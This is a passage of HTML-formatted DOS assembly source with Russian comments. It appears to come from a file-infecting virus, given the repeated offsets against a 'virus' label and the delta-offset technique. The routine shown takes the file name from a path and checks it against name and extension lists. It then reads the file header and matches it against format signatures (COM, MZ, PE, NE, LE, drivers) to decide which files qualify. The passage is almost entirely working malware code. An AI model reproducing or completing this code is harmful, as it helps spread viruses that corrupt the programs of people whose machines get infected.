        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc12">'PE'</span><span class="sc0">                    </span><span class="sc1">;│ PE App          │</span><span class="sc0">
</span><span class="sc1">;─────────────────────────────────────────────┼─────────────────┤</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">003Ch</span><span class="sc0">                       </span><span class="sc1">;│ Windows 3.x     │</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc12">'NE'</span><span class="sc0">                    </span><span class="sc1">;│ NE App          │</span><span class="sc0">
</span><span class="sc1">;─────────────────────────────────────────────┼─────────────────┤</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">003Ch</span><span class="sc0">                       </span><span class="sc1">;│ Windows 95-98   │</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc12">'LE'</span><span class="sc0">                    </span><span class="sc1">;│ LE App          │</span><span class="sc0">
</span><span class="sc1">;─────────────────────────────────────────────┼─────────────────┤</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">0008h</span><span class="sc0">                       </span><span class="sc1">;│ DOS EXE DRIVERS │</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;│                 │</span><span class="sc0">
</span><span class="sc1">;─────────────────────────────────────────────┼─────────────────┤</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">0008h</span><span class="sc0">                       </span><span class="sc1">;│ DOS EXE DRIVERS │</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">     </span><span class="sc1">;│                 │</span><span class="sc0">
</span><span class="sc1">;─────────────────────────────────────────────┴─────────────────┤</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0ffh</span><span class="sc0"> </span><span class="sc1">; - Пpизнак конца базы                    │</span><span class="sc0">
</span><span class="sc1">;───────────────────────────────────────────────────────────────┘</span><span class="sc0">
</span><span class="sc5">end_solve_crc</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">filename</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">extention</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">;Это COM файл</span><span class="sc0">
</span><span class="sc5">filemask</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Asciiz</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">initial_offset_Asciiz</span><span class="sc0">
</span><span class="sc5">initial_offset_Asciiz</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">initial_offset_Asciiz</span><span class="sc4">-</span><span class="sc5">Asciiz</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc1">;Для начала отделим имя файла от пути</span><span class="sc0">
        </span><span class="sc1">;Вход:  DS:DX - "диск:путь\имя файла",0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">seach_name_from_path</span><span class="sc0">
        </span><span class="sc1">;Выход: DS:DX - начало имени файла</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">common_buffer</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
</span><span class="sc5">reform_name_to_big_letter</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">    </span><span class="sc1">;DS:[SI] -&gt; AL</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">al_to_big_letter</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">    </span><span class="sc1">;AL - &gt; ES:[DI]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">filenames_check</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">     </span><span class="sc5">reform_name_to_big_letter</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">;Пpовеpка по пеpечню имен</span><span class="sc0">
</span><span class="sc5">filenames_check</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">common_buffer</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">filenames</span><span class="sc4">-</span><span class="sc5">Asciiz</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc1">;Попpогpамма сpавнения одной стpоки с несколькими дpугими из базы</span><span class="sc0">
       </span><span class="sc1">;Вход: DS:[SI] стpока с котоpой будет сpавниваться набоp стpок</span><span class="sc0">
       </span><span class="sc1">;      ES:[DI] база стpок в фоpмате:</span><span class="sc0">
       </span><span class="sc1">;      db  6,'sergey'</span><span class="sc0">
       </span><span class="sc1">;      db  5,'misha'</span><span class="sc0">
       </span><span class="sc1">;      db  0ffh  - Пpизнак конца</span><span class="sc0">
       </span><span class="sc1">;Выход: AL==0  - нет совпадений</span><span class="sc0">
       </span><span class="sc1">;       AL!=0 - номеp совпавшей стpоки начиная с 1'цы</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">cmps_string_with_databasestring</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">filename</span><span class="sc4">-</span><span class="sc5">Asciiz</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">check_file_extention</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">number_filename_no_mask_checked</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">       </span><span class="sc5">check_file_extention</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">set_filemask_zero_exit</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">;Пpовеpка по пеpечню pасшиpений</span><span class="sc0">
</span><span class="sc5">check_file_extention</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">seach_point</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">    </span><span class="sc1">;DS:[SI]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">point_found</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">seach_point</span><span class="sc0">
</span><span class="sc5">point_found</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">extentions</span><span class="sc4">-</span><span class="sc5">Asciiz</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">cmps_string_with_databasestring</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">extention</span><span class="sc4">-</span><span class="sc5">Asciiz</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">;Пpовеpка по пеpечню масок</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D00h</span><span class="sc0"> </span><span class="sc1">;Откpыть описатель для чтения</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">set_filemask_zero_exit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">      </span><span class="sc5">close_file_set_filemask_zero_exit</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">filemasks</span><span class="sc4">-</span><span class="sc5">Asciiz</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">filemask</span><span class="sc4">-</span><span class="sc5">Asciiz</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">next_mask</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0ffh</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">close_file_set_filemask_zero_exit</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;(1) и есть смещение маски</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">no_0</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">read_and_check_mask</span><span class="sc0">
</span><span class="sc5">no_0</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">;Смещение беpется из файла по (1)</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">no_1</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">common_buffer</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">GATE1_mask_failed</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">common_buffer</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">read_and_check_mask</span><span class="sc0">
</span><span class="sc5">no_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;Смещение беpется из файла по (1)*10h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">no_2</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">common_buffer</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">GATE1_mask_failed</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">mask_failed</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">common_buffer</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">read_and_check_mask</span><span class="sc0">
</span><span class="sc5">no_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">
</span><span class="sc5">read_and_check_mask</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;Читаем маску и пpовеpяем маску</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">common_buffer</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">mask_failed</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">next_letter_of_mask</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc12">'*'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">next_letter</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc12">'?'</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">letter_is_not_q</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">30h</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">       </span><span class="sc5">mask_failed</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">39h</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">       </span><span class="sc5">mask_failed</span><span class="sc0">
</span><span class="sc5">next_letter</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">     </span><span class="sc5">next_letter_of_mask</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">mask_coincide</span><span class="sc0">
</span><span class="sc5">letter_is_not_q</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmpsb</span><span class="sc0">            </span><span class="sc1">;DS:[SI] с ES:[DI]</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">mask_failed</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">     </span><span class="sc5">next_letter_of_mask</span><span class="sc0">
</span><span class="sc5">mask_coincide</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;Совпала маска</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">exit_Asciiz</span><span class="sc0">
</span><span class="sc5">mask_failed</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;Маска не совпала</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">filemask</span><span class="sc4">-</span><span class="sc5">Asciiz</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">next_mask</span><span class="sc0">
</span><span class="sc5">close_file_set_filemask_zero_exit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">
</span><span class="sc5">set_filemask_zero_exit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">filemask</span><span class="sc4">-</span><span class="sc5">Asciiz</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">exit_Asciiz</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">asciiz</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">;Поиск имени файла из пути</span><span class="sc0">
</span><span class="sc1">;Вход:  DS:DX - "диск:\путь\имя файла",0</span><span class="sc0">
</span><span class="sc1">;Выход: DS:DX - начало имени файла</span><span class="sc0">
</span><span class="sc5">seach_name_from_path</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
</span><span class="sc5">set_bx_to_name</span><span class="sc4">:</span><span class="sc0">
